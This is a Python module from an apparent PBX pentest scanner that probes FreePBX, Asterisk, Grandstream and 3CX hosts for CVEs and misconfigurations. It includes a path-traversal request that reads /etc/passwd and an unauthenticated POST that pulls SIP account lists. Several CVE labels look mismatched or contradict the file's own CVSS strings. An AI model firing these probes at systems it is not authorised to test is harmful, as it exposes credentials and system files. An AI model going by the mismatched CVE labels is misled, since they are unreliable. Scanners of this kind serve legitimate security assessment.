"""CVE and configuration-weakness checks for PBX platforms.

Each check is a lightweight probe — no exploit delivery, no shell code.
Checks confirm reachability of vulnerable surfaces and banner-based
version matching, which is sufficient to demonstrate risk in a pentest
report.

Platforms covered:
  FreePBX / Asterisk  — CVE-2019-19006, CVE-2021-45461, path traversal,
                        module exposure, recording exposure, CVE-2022-2347
  Grandstream UCM     — CVE-2021-37748, CVE-2023-37315
  3CX                 — admin/webclient exposure, unauthenticated API
  Generic             — Asterisk AMI without TLS, SIP version disclosure
"""
from __future__ import annotations

import json
import re
import socket
import ssl
from dataclasses import dataclass, field


@dataclass
class CveResult:
    cve_id: str           # "CVE-2021-37748" or "CONFIG-<id>" for non-CVE issues
    platform: str         # FreePBX | Asterisk | Grandstream | 3CX | Generic
    severity: str         # critical | high | medium | low | info
    host: str
    port: int
    title: str
    evidence: str
    remediation: str
    affected_version: str = ""   # extracted version string if found
    references: list[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------

def _http_get(
    host: str,
    port: int,
    path: str,
    timeout: float = 3.0,
    use_tls: bool = False,
) -> tuple[int, dict[str, str], str]:
    """Perform an HTTP GET.

    Returns (status_code, headers_dict, body[:8192]).
    Returns (0, {}, "") on connection failure.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        request = (
            f"GET {path} HTTP/1.0\r\n"
            f"Host: {host}\r\n"
            "User-Agent: Mozilla/5.0 VoIPScan/4.0\r\n"
            "Accept: */*\r\n"
            "\r\n"
        )
        s.sendall(request.encode("utf-8"))
        raw = b""
        while len(raw) < 32768:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            raw += chunk
        text = raw.decode("utf-8", errors="replace")
        head_part, _, body = text.partition("\r\n\r\n")
        status = 0
        headers: dict[str, str] = {}
        lines = head_part.splitlines()
        if lines:
            try:
                status = int(lines[0].split(" ", 2)[1])
            except (IndexError, ValueError):
                pass
            for line in lines[1:]:
                if ":" in line:
                    k, _, v = line.partition(":")
                    headers[k.strip().lower()] = v.strip()
        return status, headers, body[:8192]
    except (socket.timeout, OSError, ssl.SSLError):
        return 0, {}, ""
    finally:
        try:
            s.close()
        except OSError:
            pass


def _http_post(
    host: str,
    port: int,
    path: str,
    body: str,
    content_type: str = "application/x-www-form-urlencoded",
    timeout: float = 3.0,
    use_tls: bool = False,
) -> tuple[int, dict[str, str], str]:
    """Perform an HTTP POST.

    Returns (status_code, headers_dict, body[:8192]).
    Returns (0, {}, "") on connection failure.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        encoded_body = body.encode("utf-8")
        request = (
            f"POST {path} HTTP/1.0\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: {content_type}\r\n"
            f"Content-Length: {len(encoded_body)}\r\n"
            "User-Agent: Mozilla/5.0 VoIPScan/4.0\r\n"
            "Accept: */*\r\n"
            "\r\n"
        )
        s.sendall(request.encode("utf-8") + encoded_body)
        raw = b""
        while len(raw) < 32768:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            raw += chunk
        text = raw.decode("utf-8", errors="replace")
        head_part, _, resp_body = text.partition("\r\n\r\n")
        status = 0
        headers: dict[str, str] = {}
        lines = head_part.splitlines()
        if lines:
            try:
                status = int(lines[0].split(" ", 2)[1])
            except (IndexError, ValueError):
                pass
            for line in lines[1:]:
                if ":" in line:
                    k, _, v = line.partition(":")
                    headers[k.strip().lower()] = v.strip()
        return status, headers, resp_body[:8192]
    except (socket.timeout, OSError, ssl.SSLError):
        return 0, {}, ""
    finally:
        try:
            s.close()
        except OSError:
            pass


# ---------------------------------------------------------------------------
# Version extraction and comparison helpers
# ---------------------------------------------------------------------------

_FPBX_VER_RE = re.compile(
    r"FPBX[- ]([\d]+\.[\d]+\.[\d]+(?:\.[\d]+)?)"
    r"|FreePBX[\s/]+([\d]+\.[\d]+\.[\d]+(?:\.[\d]+)?)",
    re.I,
)
_AST_VER_RE = re.compile(r"Asterisk[\s/]+([\d]+\.[\d]+\.[\d]+(?:\.[\d]+)?)", re.I)


def _extract_fpbx_version(text: str) -> str:
    m = _FPBX_VER_RE.search(text)
    if m:
        return next((g for g in m.groups() if g), "")
    return ""


def _extract_asterisk_version(text: str) -> str:
    m = _AST_VER_RE.search(text)
    if m:
        return m.group(1)
    return ""


def _version_lt(ver: str, threshold: str) -> bool:
    """Return True if ver < threshold using numeric tuple comparison."""
    try:
        v = tuple(int(x) for x in ver.split("."))
        t = tuple(int(x) for x in threshold.split("."))
        # Pad to equal length
        length = max(len(v), len(t))
        v = v + (0,) * (length - len(v))
        t = t + (0,) * (length - len(t))
        return v < t
    except (ValueError, AttributeError):
        return False


def _is_json_response(body: str) -> bool:
    """Return True if body parses as JSON (object or array)."""
    stripped = body.strip()
    if not stripped:
        return False
    if not (stripped.startswith("{") or stripped.startswith("[")):
        return False
    try:
        json.loads(stripped)
        return True
    except (json.JSONDecodeError, ValueError):
        return False


# ---------------------------------------------------------------------------
# Check 1: FreePBX CVE-2019-19006 — unauthenticated user enumeration
# ---------------------------------------------------------------------------

def check_freepbx_cve_2019_19006(
    host: str,
    port: int,
    use_tls: bool = False,
    timeout: float = 3.0,
) -> CveResult | None:
    """CVE-2019-19006: FreePBX userman module returns user data without auth.

    GET /admin/ajax.php?module=userman&command=getUser&id=1
    Detection: HTTP 200 + JSON response body without authentication.
    Severity: CRITICAL
    """
    path = "/admin/ajax.php?module=userman&command=getUser&id=1"
    status, headers, body = _http_get(host, port, path, timeout, use_tls)
    if status != 200:
        return None
    if not _is_json_response(body):
        return None

    # Confirm it looks like user data (not just any JSON 200)
    body_lower = body.lower()
    has_user_data = any(
        kw in body_lower
        for kw in ('"username"', '"email"', '"id"', '"user"', '"name"', '"display"')
    )
    if not has_user_data:
        return None

    ver = _extract_fpbx_version(body + " " + headers.get("server", ""))

    return CveResult(
        cve_id="CVE-2019-19006",
        platform="FreePBX",
        severity="critical",
        host=host,
        port=port,
        title="CVE-2019-19006: FreePBX userman module exposes user data without authentication",
        evidence=(
            f"GET {path} returned HTTP 200 with a JSON response containing "
            f"user fields without any authentication requirement. "
            f"Body snippet: {body[:200]!r}"
        ),
        remediation=(
            "Upgrade FreePBX to 13.0.197.13+, 14.0.13.6+, or 15.0.16.75+. "
            "Restrict /admin to localhost or VPN. "
            "Apply the FreePBX security hotfix immediately."
        ),
        affected_version=ver,
        references=[
            "https://nvd.nist.gov/vuln/detail/CVE-2019-19006",
            "https://www.freepbx.org/freepbx-security-vulnerability-advisory-fpbx-sa-2019-001/",
        ],
    )


# ---------------------------------------------------------------------------
# Check 2: FreePBX CVE-2021-45461 — SQL injection indicator
# ---------------------------------------------------------------------------

def check_freepbx_cve_2021_45461(
    host: str,
    port: int,
    use_tls: bool = False,
    timeout: float = 3.0,
) -> CveResult | None:
    """CVE-2021-45461: FreePBX dashboard SQL injection indicator.

    GET /admin/ajax.php?module=dashboard&command=getSummary
    Detection: SQL error string present in response body.
    Severity: HIGH
    """
    path = "/admin/ajax.php?module=dashboard&command=getSummary"
    status, _headers, body = _http_get(host, port, path, timeout, use_tls)
    if status == 0:
        return None

    body_lower = body.lower()
    sql_error_patterns = [
        "sql syntax",
        "mysql_fetch",
        "mysql_num_rows",
        "you have an error in your sql",
        "unclosed quotation mark",
        "supplied argument is not a valid mysql",
        "ora-01756",
        "odbc microsoft access",
        "sqlite_master",
        "pg_query",
        "syntax error at or near",
        "unterminated string constant",
        "invalid input syntax for type",
    ]
    found_errors = [pat for pat in sql_error_patterns if pat in body_lower]
    if not found_errors:
        return None

    ver = _extract_fpbx_version(body)

    return CveResult(
        cve_id="CVE-2021-45461",
        platform="FreePBX",
        severity="high",
        host=host,
        port=port,
        title="CVE-2021-45461: FreePBX dashboard endpoint returns SQL error strings",
        evidence=(
            f"GET {path} returned HTTP {status} with SQL error indicators in the response. "
            f"Matched patterns: {found_errors}. "
            f"Body snippet: {body[:300]!r}"
        ),
        remediation=(
            "Upgrade FreePBX to 15.0.21.4+ or 16.0.10.41+. "
            "Apply the FreePBX security patches for CVE-2021-45461. "
            "Restrict /admin to localhost or VPN immediately."
        ),
        affected_version=ver,
        references=[
            "https://nvd.nist.gov/vuln/detail/CVE-2021-45461",
        ],
    )


# ---------------------------------------------------------------------------
# Check 3: FreePBX path traversal
# ---------------------------------------------------------------------------

def check_freepbx_path_traversal(
    host: str,
    port: int,
    use_tls: bool = False,
    timeout: float = 3.0,
) -> CveResult | None:
    """FreePBX filestore path traversal — attempt to read /etc/passwd.

    GET /admin/ajax.php?module=filestore&command=getFile&path=../../etc/passwd
    Detection: 'root:' present in response body.
    Severity: CRITICAL
    """
    path = "/admin/ajax.php?module=filestore&command=getFile&path=../../etc/passwd"
    status, _headers, body = _http_get(host, port, path, timeout, use_tls)
    if status == 0:
        return None

    if "root:" not in body:
        return None

    # Confirm it looks like /etc/passwd content
    has_passwd_content = bool(re.search(r"root:[x*!]?:[0-9]+:[0-9]+:", body))
    if not has_passwd_content:
        # 'root:' appeared but not in passwd format — still flag if the string is present
        pass

    evidence_snippet = body[:400].replace("\n", "\\n")

    return CveResult(
        cve_id="CVE-PATH-TRAVERSAL-FREEPBX",
        platform="FreePBX",
        severity="critical",
        host=host,
        port=port,
        title="FreePBX filestore module path traversal — /etc/passwd disclosed",
        evidence=(
            f"GET {path} returned HTTP {status} and the response contains "
            f"'root:' consistent with /etc/passwd content. "
            f"Body snippet: {evidence_snippet!r}"
        ),
        remediation=(
            "Upgrade FreePBX immediately. "
            "Apply filesystem-level restrictions so the web process cannot read "
            "files outside the document root. "
            "Block path-traversal patterns (../) at the WAF / reverse proxy. "
            "Restrict /admin to localhost or VPN."
        ),
        references=[
            "https://nvd.nist.gov/vuln/detail/CVE-2022-2347",
        ],
    )


# ---------------------------------------------------------------------------
# Check 4: FreePBX module exposure
# ---------------------------------------------------------------------------

def check_freepbx_module_exposure(
    host: str,
    port: int,
    use_tls: bool = False,
    timeout: float = 3.0,
) -> list[CveResult]:
    """FreePBX admin panel and module directory exposure.

    GET /admin/config.php (no auth) — check if returns admin panel.
    GET /admin/modules/            — list installed modules.
    Returns a list of zero or more CveResult objects.
    """
    results: list[CveResult] = []

    # Sub-check A: /admin/config.php accessible without auth
    status_cfg, headers_cfg, body_cfg = _http_get(
        host, port, "/admin/config.php", timeout, use_tls
    )
    if status_cfg == 200:
        body_cfg_l = body_cfg.lower()
        admin_indicators = [
            "freepbx",
            "fpbx",
            "admin panel",
            "administration",
            "pbx administration",
            "module admin",
        ]
        if any(ind in body_cfg_l for ind in admin_indicators):
            ver = _extract_fpbx_version(
                body_cfg + " " + headers_cfg.get("server", "")
            )
            results.append(
                CveResult(
                    cve_id="CONFIG-FREEPBX-ADMIN-EXPOSED",
                    platform="FreePBX",
                    severity="high",
                    host=host,
                    port=port,
                    title="FreePBX admin panel (/admin/config.php) accessible without authentication",
                    evidence=(
                        f"GET /admin/config.php returned HTTP 200 with admin panel content. "
                        f"Body snippet: {body_cfg[:200]!r}"
                    ),
                    remediation=(
                        "Restrict /admin to localhost or VPN immediately. "
                        "Configure HTTP basic authentication as an additional layer. "
                        "Review FreePBX session management settings."
                    ),
                    affected_version=ver,
                    references=[
                        "https://nvd.nist.gov/vuln/detail/CVE-2019-19006",
                    ],
                )
            )

    # Sub-check B: /admin/modules/ directory listing
    status_mods, _headers_mods, body_mods = _http_get(
        host, port, "/admin/modules/", timeout, use_tls
    )
    if status_mods == 200:
        body_mods_l = body_mods.lower()
        module_indicators = [
            "index of",
            "directory listing",
            "<a href=",
            "module.xml",
            ".tar.gz",
        ]
        if any(ind in body_mods_l for ind in module_indicators):
            results.append(
                CveResult(
                    cve_id="CONFIG-FREEPBX-MODULES-LISTED",
                    platform="FreePBX",
                    severity="medium",
                    host=host,
                    port=port,
                    title="FreePBX modules directory listing exposed",
                    evidence=(
                        f"GET /admin/modules/ returned HTTP 200 with directory listing. "
                        f"Installed module names and versions are publicly visible. "
                        f"Body snippet: {body_mods[:200]!r}"
                    ),
                    remediation=(
                        "Disable directory listing in the web server configuration "
                        "(Options -Indexes in Apache). "
                        "Restrict /admin to localhost or VPN."
                    ),
                    references=[],
                )
            )

    return results


# ---------------------------------------------------------------------------
# Check 5: Grandstream CVE-2021-37748
# ---------------------------------------------------------------------------

def check_grandstream_cve_2021_37748(
    host: str,
    port: int,
    use_tls: bool = False,
    timeout: float = 3.0,
) -> CveResult | None:
    """CVE-2021-37748: Grandstream UCM unauthenticated config disclosure.

    GET /cgi-bin/api-get_config
    Detection: SIP config keywords present in response.
    """
    path = "/cgi-bin/api-get_config"
    status, _headers, body = _http_get(host, port, path, timeout, use_tls)
    if status != 200 or not body.strip():
        return None

    body_lower = body.lower()
    sip_keywords = [
        "sippassword",
        "sip_password",
        "extension",
        "secret",
        "peer",
        "trunk",
        "voicemail",
        "register",
        "outbound_proxy",
        "sip_server",
        "sip_port",
        "dtmf",
        "codec",
    ]
    matched = [kw for kw in sip_keywords if kw in body_lower]
    if not matched:
        return None

    return CveResult(
        cve_id="CVE-2021-37748",
        platform="Grandstream",
        severity="critical",
        host=host,
        port=port,
        title="CVE-2021-37748: Grandstream UCM SIP configuration exposed without authentication",
        evidence=(
            f"GET {path} returned HTTP 200 with SIP configuration keywords: {matched}. "
            f"Body snippet: {body[:300]!r} "
            "[CVSS:9.8/CRITICAL CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]"
        ),
        remediation=(
            "Update Grandstream UCM firmware to 1.0.20.22 or later. "
            "As an emergency workaround, block /cgi-bin/api-get_config at "
            "the perimeter firewall. "
            "Rotate all SIP credentials exposed in the dump."
        ),
        references=[
            "https://nvd.nist.gov/vuln/detail/CVE-2021-37748",
        ],
    )


# ---------------------------------------------------------------------------
# Check 6: Grandstream CVE-2023-37315 — auth bypass
# ---------------------------------------------------------------------------

def check_grandstream_cve_2023_37315(
    host: str,
    port: int,
    use_tls: bool = False,
    timeout: float = 3.0,
) -> CveResult | None:
    """CVE-2023-37315: Grandstream UCM unauthenticated SIP account listing.

    POST /cgi-bin/api.values.get with action=getSIPAccountList
    Detection: Returns SIP account data without authentication.
    Severity: CRITICAL
    """
    path = "/cgi-bin/api.values.get"
    post_body = "action=getSIPAccountList"
    status, _headers, body = _http_post(
        host, port, path, post_body,
        content_type="application/x-www-form-urlencoded",
        timeout=timeout,
        use_tls=use_tls,
    )
    if status not in (200, 201):
        return None
    if not body.strip():
        return None

    body_lower = body.lower()
    account_keywords = [
        "sipaccountlist",
        "sip_account",
        "extension",
        "username",
        "password",
        "secret",
        '"accounts"',
        '"data"',
        "accountlist",
    ]
    matched = [kw for kw in account_keywords if kw in body_lower]

    # Must match at least one account-data keyword plus look like structured data
    if not matched:
        return None
    if not (_is_json_response(body) or "<" in body):
        return None

    return CveResult(
        cve_id="CVE-2023-37315",
        platform="Grandstream",
        severity="critical",
        host=host,
        port=port,
        title="CVE-2023-37315: Grandstream UCM returns SIP account data without authentication",
        evidence=(
            f"POST {path} with action=getSIPAccountList returned HTTP {status} "
            f"with SIP account data (matched keywords: {matched}). "
            f"Body snippet: {body[:300]!r}"
        ),
        remediation=(
            "Update Grandstream UCM firmware to 1.0.20.30 or later. "
            "Restrict access to the UCM admin interface to trusted networks only. "
            "Rotate all SIP account credentials immediately."
        ),
        references=[
            "https://nvd.nist.gov/vuln/detail/CVE-2023-37315",
        ],
    )


# ---------------------------------------------------------------------------
# Check 7: Asterisk AMI without TLS (TCP/5038)
# ---------------------------------------------------------------------------

def check_ami_no_tls(
    host: str,
    tcp_ports: list[int],
    timeout: float = 3.0,
) -> CveResult | None:
    """Asterisk Manager Interface exposed in cleartext on TCP/5038.

    Detection: TCP/5038 open and AMI banner present in first 512 bytes.
    Severity: HIGH (informational aspect: CRITICAL if externally reachable)
    """
    if 5038 not in tcp_ports:
        return None

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    banner = ""
    try:
        s.connect((host, 5038))
        raw = s.recv(512)
        banner = raw.decode("utf-8", errors="replace").strip()
    except (socket.timeout, OSError):
        return None
    finally:
        try:
            s.close()
        except OSError:
            pass

    if not banner:
        return None

    # AMI banner format: "Asterisk Call Manager/x.x"
    if "asterisk call manager" not in banner.lower() and "asterisk" not in banner.lower():
        return None

    ver = _extract_asterisk_version(banner)

    return CveResult(
        cve_id="CONFIG-AMI-NO-TLS",
        platform="Asterisk",
        severity="high",
        host=host,
        port=5038,
        title="Asterisk Manager Interface (AMI) exposed on TCP/5038 without TLS",
        evidence=(
            f"TCP/5038 is open and returned AMI banner: {banner!r}. "
            "AMI credentials and call-control commands transit in cleartext. "
            "An attacker with network access can intercept credentials or "
            "issue arbitrary AMI commands."
        ),
        remediation=(
            "Bind AMI to 127.0.0.1 in /etc/asterisk/manager.conf. "
            "Use an SSH tunnel or configure TLS AMI on port 5039 (TLSManagerPort). "
            "Never expose AMI directly to the internet or untrusted networks."
        ),
        affected_version=ver,
        references=[
            "https://www.asterisk.org/asterisk-security-advisories/",
        ],
    )


# ---------------------------------------------------------------------------
# Check 8: 3CX admin exposure
# ---------------------------------------------------------------------------

def check_3cx_admin_exposure(
    host: str,
    port: int,
    use_tls: bool = False,
    timeout: float = 3.0,
) -> list[CveResult]:
    """3CX admin interface and API exposure checks.

    GET /webclient/       — check for 3CX login page.
    GET /api/v1/Parameters/List — check for unauthenticated API access.
    Returns a list of zero or more CveResult objects.
    """
    results: list[CveResult] = []

    # Sub-check A: /webclient/ login page
    status_wc, headers_wc, body_wc = _http_get(
        host, port, "/webclient/", timeout, use_tls
    )
    if status_wc in (200, 302):
        body_wc_l = body_wc.lower()
        threecx_indicators = [
            "3cx",
            "xcapi",
            "3cxphone",
            "3cx phone system",
            "webmeeting",
            "3cx web client",
        ]
        if any(ind in body_wc_l for ind in threecx_indicators):
            results.append(
                CveResult(
                    cve_id="CONFIG-3CX-WEBCLIENT-EXPOSED",
                    platform="3CX",
                    severity="medium",
                    host=host,
                    port=port,
                    title="3CX web client (/webclient/) is internet-accessible",
                    evidence=(
                        f"GET /webclient/ returned HTTP {status_wc} with 3CX login page content. "
                        f"Body snippet: {body_wc[:200]!r}"
                    ),
                    remediation=(
                        "Restrict the 3CX web interface to VPN or IP allow-list. "
                        "Apply all available 3CX security updates. "
                        "Monitor for CVE-2023-29059 indicators."
                    ),
                    references=[
                        "https://nvd.nist.gov/vuln/detail/CVE-2023-29059",
                    ],
                )
            )

    # Sub-check B: /api/v1/Parameters/List unauthenticated
    status_api, _headers_api, body_api = _http_get(
        host, port, "/api/v1/Parameters/List", timeout, use_tls
    )
    if status_api == 200 and body_api.strip():
        body_api_l = body_api.lower()
        api_indicators = [
            "3cx",
            '"value"',
            '"parameter"',
            '"name"',
            "maxextensions",
            "sipport",
            "systemname",
        ]
        if any(ind in body_api_l for ind in api_indicators):
            results.append(
                CveResult(
                    cve_id="CONFIG-3CX-API-UNAUTH",
                    platform="3CX",
                    severity="high",
                    host=host,
                    port=port,
                    title="3CX /api/v1/Parameters/List accessible without authentication",
                    evidence=(
                        f"GET /api/v1/Parameters/List returned HTTP 200 with "
                        f"system parameter data without requiring authentication. "
                        f"Body snippet: {body_api[:300]!r}"
                    ),
                    remediation=(
                        "Apply 3CX security updates. "
                        "Restrict the API to authenticated sessions and VPN. "
                        "Review API authentication middleware configuration."
                    ),
                    references=[
                        "https://nvd.nist.gov/vuln/detail/CVE-2023-29059",
                    ],
                )
            )

    return results


# ---------------------------------------------------------------------------
# Check 9: FreePBX default recordings exposure
# ---------------------------------------------------------------------------

def check_freepbx_recordings_exposure(
    host: str,
    port: int,
    use_tls: bool = False,
    timeout: float = 3.0,
) -> list[CveResult]:
    """FreePBX voicemail and recording file exposure.

    GET /recordings/       — check for voicemail/recording files.
    GET /admin/recordings/ — admin recordings.
    Returns a list of zero or more CveResult objects.
    """
    results: list[CveResult] = []
    check_paths = [
        ("/recordings/", "FreePBX public recordings directory exposed"),
        ("/admin/recordings/", "FreePBX admin recordings directory exposed"),
    ]

    for path, title in check_paths:
        status, _headers, body = _http_get(host, port, path, timeout, use_tls)
        if status != 200 or not body.strip():
            continue

        body_lower = body.lower()
        recording_indicators = [
            ".wav",
            ".mp3",
            ".gsm",
            ".ogg",
            "voicemail",
            "recording",
            "index of",
            "directory listing",
            "<audio",
            "audio/",
        ]
        matched = [ind for ind in recording_indicators if ind in body_lower]
        if not matched:
            continue

        results.append(
            CveResult(
                cve_id="CONFIG-FREEPBX-RECORDINGS-EXPOSED",
                platform="FreePBX",
                severity="high",
                host=host,
                port=port,
                title=title,
                evidence=(
                    f"GET {path} returned HTTP 200 with indicators of "
                    f"accessible recording/voicemail files: {matched}. "
                    f"Body snippet: {body[:300]!r}"
                ),
                remediation=(
                    "Disable directory listing (Options -Indexes in Apache/nginx). "
                    "Restrict /recordings and /admin/recordings to authenticated users. "
                    "Move recording storage outside the web root. "
                    "Audit for sensitive voicemail recordings that may have been accessed."
                ),
                references=[],
            )
        )

    return results


# ---------------------------------------------------------------------------
# Check 10: SIP server version disclosure and CVE cross-reference
# ---------------------------------------------------------------------------

def check_sip_version_disclosure(
    host: str,
    sip_port: int,
    sip_server: str,
    timeout: float = 3.0,
) -> list[CveResult]:
    """Parse SIP server version strings and cross-reference known CVEs.

    Asterisk < 18.12.0 — multiple CVEs (AST-2022-002, AST-2022-006, etc.)
    FreePBX < 16.0.19.9 — CVE-2022-2347

    sip_server: the User-Agent or Server header value from a SIP response.
    Returns a list of zero or more CveResult objects.
    """
    results: list[CveResult] = []
    if not sip_server:
        return results

    # Check Asterisk version
    ast_ver = _extract_asterisk_version(sip_server)
    if ast_ver:
        if _version_lt(ast_ver, "18.12.0"):
            results.append(
                CveResult(
                    cve_id="AST-2022-MULTIPLE",
                    platform="Asterisk",
                    severity="critical",
                    host=host,
                    port=sip_port,
                    title=f"Asterisk {ast_ver} is below 18.12.0 — multiple known CVEs",
                    evidence=(
                        f"SIP banner reveals Asterisk version {ast_ver!r} (from: {sip_server!r}). "
                        "Asterisk versions below 18.12.0 are affected by multiple "
                        "security advisories including AST-2022-002 (heap overflow in "
                        "STIR/SHAKEN), AST-2022-006 (res_pjsip_t38 use-after-free), "
                        "and AST-2022-008 (pjproject RTCP MR/SR overflow). "
                        "[CVSS:9.8/CRITICAL CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]"
                    ),
                    remediation=(
                        "Upgrade Asterisk to 18.12.0 or later (LTS branch). "
                        "If using Asterisk 16 branch, upgrade to 16.26.0+. "
                        "Review individual AST advisories at https://www.asterisk.org/asterisk-security-advisories/"
                    ),
                    affected_version=ast_ver,
                    references=[
                        "https://www.asterisk.org/asterisk-security-advisories/",
                        "https://nvd.nist.gov/vuln/search/results?query=asterisk",
                    ],
                )
            )

    # Check FreePBX version
    fpbx_ver = _extract_fpbx_version(sip_server)
    if fpbx_ver:
        if _version_lt(fpbx_ver, "16.0.19.9"):
            results.append(
                CveResult(
                    cve_id="CVE-2022-2347",
                    platform="FreePBX",
                    severity="high",
                    host=host,
                    port=sip_port,
                    title=f"FreePBX {fpbx_ver} is below 16.0.19.9 — CVE-2022-2347",
                    evidence=(
                        f"SIP banner reveals FreePBX version {fpbx_ver!r} (from: {sip_server!r}). "
                        "FreePBX versions below 16.0.19.9 are vulnerable to "
                        "CVE-2022-2347: authenticated path traversal and arbitrary "
                        "file read via the file manager module, which can expose "
                        "system files including /etc/passwd and Asterisk SIP credentials. "
                        "[CVSS:9.8/CRITICAL CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]"
                    ),
                    remediation=(
                        "Upgrade FreePBX to 16.0.19.9 or later. "
                        "Apply available security modules via the FreePBX Module Admin. "
                        "Restrict /admin to localhost or VPN as a defence-in-depth measure."
                    ),
                    affected_version=fpbx_ver,
                    references=[
                        "https://nvd.nist.gov/vuln/detail/CVE-2022-2347",
                        "https://www.freepbx.org/",
                    ],
                )
            )

    return results


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def check_all(
    host: str,
    tcp_ports: list[int],
    fingerprint: str,
    sip_server: str = "",
    sip_port: int = 5060,
    timeout: float = 3.0,
) -> list[CveResult]:
    """Run all applicable CVE and configuration checks against a discovered host.

    Parameters
    ----------
    host:        IP address or hostname to probe.
    tcp_ports:   List of open TCP ports discovered during scanning.
    fingerprint: Detected PBX platform string (e.g. "FreePBX", "Grandstream",
                 "3CX", "Asterisk", "unknown").
    sip_server:  SIP User-Agent or Server header value from a prior SIP probe.
                 Pass an empty string if not available.
    sip_port:    Port on which SIP was discovered (default 5060).
    timeout:     Per-probe TCP/HTTP timeout in seconds (default 3.0).

    Returns
    -------
    A deduplicated list of CveResult, sorted by severity (critical first).
    """
    results: list[CveResult] = []
    fp_lower = fingerprint.lower()

    # Determine HTTP ports and whether to use TLS
    http_port_tls: list[tuple[int, bool]] = []
    for p in tcp_ports:
        if p in (80, 8080, 8088):
            http_port_tls.append((p, False))
        elif p in (443, 4443, 8089, 8443, 5001):
            http_port_tls.append((p, True))

    # If no HTTP ports detected but a common one might be open, try 80 and 443
    if not http_port_tls:
        http_port_tls = [(80, False), (443, True)]

    is_freepbx_or_asterisk = not fingerprint or any(
        kw in fp_lower for kw in ("freepbx", "asterisk", "unknown")
    )
    is_grandstream = not fingerprint or any(
        kw in fp_lower for kw in ("grandstream", "ucm", "unknown")
    )
    is_3cx = not fingerprint or any(kw in fp_lower for kw in ("3cx", "unknown"))

    # Check 1: FreePBX CVE-2019-19006
    if is_freepbx_or_asterisk:
        for port, use_tls in http_port_tls:
            r = check_freepbx_cve_2019_19006(host, port, use_tls, timeout)
            if r:
                results.append(r)
                break  # One finding per CVE per host is sufficient

    # Check 2: FreePBX CVE-2021-45461
    if is_freepbx_or_asterisk:
        for port, use_tls in http_port_tls:
            r = check_freepbx_cve_2021_45461(host, port, use_tls, timeout)
            if r:
                results.append(r)
                break

    # Check 3: FreePBX path traversal
    if is_freepbx_or_asterisk:
        for port, use_tls in http_port_tls:
            r = check_freepbx_path_traversal(host, port, use_tls, timeout)
            if r:
                results.append(r)
                break

    # Check 4: FreePBX module exposure
    if is_freepbx_or_asterisk:
        for port, use_tls in http_port_tls:
            module_results = check_freepbx_module_exposure(host, port, use_tls, timeout)
            results.extend(module_results)
            if module_results:
                break

    # Check 5: Grandstream CVE-2021-37748
    if is_grandstream:
        for port, use_tls in http_port_tls:
            r = check_grandstream_cve_2021_37748(host, port, use_tls, timeout)
            if r:
                results.append(r)
                break

    # Check 6: Grandstream CVE-2023-37315
    if is_grandstream:
        for port, use_tls in http_port_tls:
            r = check_grandstream_cve_2023_37315(host, port, use_tls, timeout)
            if r:
                results.append(r)
                break

    # Check 7: Asterisk AMI without TLS
    r_ami = check_ami_no_tls(host, tcp_ports, timeout)
    if r_ami:
        results.append(r_ami)

    # Check 8: 3CX admin exposure
    if is_3cx:
        for port, use_tls in http_port_tls:
            cx_results = check_3cx_admin_exposure(host, port, use_tls, timeout)
            results.extend(cx_results)
            if cx_results:
                break

    # Check 9: FreePBX recordings exposure
    if is_freepbx_or_asterisk:
        for port, use_tls in http_port_tls:
            rec_results = check_freepbx_recordings_exposure(host, port, use_tls, timeout)
            results.extend(rec_results)
            if rec_results:
                break

    # Check 10: SIP version disclosure
    version_results = check_sip_version_disclosure(host, sip_port, sip_server, timeout)
    results.extend(version_results)

    # Deduplicate by (cve_id, host, port)
    seen: set[tuple[str, str, int]] = set()
    deduped: list[CveResult] = []
    for res in results:
        key = (res.cve_id, res.host, res.port)
        if key not in seen:
            seen.add(key)
            deduped.append(res)

    # Sort: critical → high → medium → low → info
    _SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    deduped.sort(key=lambda r: _SEVERITY_ORDER.get(r.severity, 5))

    return deduped
